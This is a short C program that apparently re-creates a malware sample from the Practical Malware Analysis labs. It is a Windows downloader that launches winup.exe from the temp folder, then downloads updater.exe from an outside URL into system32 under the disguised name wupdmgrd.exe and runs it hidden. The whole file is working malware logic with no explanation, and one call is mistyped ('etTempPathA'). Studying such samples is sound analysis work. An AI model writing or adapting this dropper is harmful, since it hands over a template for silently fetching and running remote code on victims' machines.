

char* stealthName = "\\system32\\wupdmgrd.exe";
char* random = "\\winup.exe";
char* url = "http://www.practicalmalwareanalysis.com/updater.exe";

int main(){
	
	char winDir[MAX_PATH];
	char filePath[MAX_PATH];
	char randomFilePath[MAX_PATH];
	char tempDir[MAX_PATH];
	
	GetWindowsDirectoryA(winDir, sizeof(winDir));
	snprintf(filePath,sizeof(filePath), "%s%s", winDir, stealthName);
	
	etTempPathA(tempDir, MAX_PATH);
	snprintf(randomFilePath, MAX_PATH, "%s%s", tempDir, random);
	
	WinExec(randomFilePath, SW_SHOW);
	
	if (URLDownloadToFileA(NULL, url, filePath, 0, NULL) == S_OK){
		
		WinExec(filePath, SW_HIDE);
	}
	return 0;
}